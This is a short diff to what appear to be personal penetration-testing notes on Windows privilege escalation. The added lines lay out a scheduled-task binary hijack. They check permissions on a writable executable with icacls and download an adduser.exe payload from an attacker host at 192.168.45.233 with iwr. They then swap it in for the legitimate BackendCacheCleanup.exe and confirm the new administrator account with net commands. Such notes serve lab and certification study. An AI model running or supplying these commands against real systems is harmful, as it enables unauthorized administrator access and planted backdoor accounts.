@@ -117,6 +117,14 @@ When you gain access to a windows user do steps bellow:
 
       Get-ScheduledTask #powershlle      
       schtasks /query /fo LIST /v #CMD add '|more' to page
+      icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe # to confirming permission
+      iwr -Uri http://192.168.45.233:8000/adduser.exe -Outfile BackendCacheCleanup.exe
+      move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+      move .\BackendCacheCleanup.exe .\Pictures\
+      #for to confirm
+      net user
+      net localgroup administrators
+      
       
       
 
